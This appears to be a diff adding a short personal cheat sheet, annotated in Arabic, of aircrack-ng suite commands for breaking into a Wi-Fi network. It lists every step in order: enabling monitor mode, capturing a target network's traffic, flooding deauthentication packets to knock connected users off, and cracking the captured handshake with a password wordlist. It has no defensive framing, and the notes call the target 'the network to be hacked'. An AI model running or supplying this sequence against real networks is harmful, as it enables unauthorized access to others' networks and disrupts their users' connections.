@@ -1,0 +1,17 @@
+iwconfig    معرفة توصيلة
+
+airmon-ng start (wlan0)        تفعيل وضع المراقبة moniter
+
+airmon-ng check kill      طرد اي عملية تجسس
+
+airodump-ng (wlan0)  استقطاب الشبكات 
+
+write #(chennel) and ~~(bssid)   
+
+airodump-ng (wlan0) -w "Desktop/******" -c #  --bssid ~~~            مراقبة الشبكة مراد اختراقها
+
+aireplay-ng --deauth 0 -a [bssid] (wlan0)        طرد الاشخاص من الشبكة 
+
+aircrack-ng Desktop/*****.cap -w *****.txt  كسر كلمة المرور 
+
+service NetworkManager start  ارجاع الى وضع الاستقطاب 
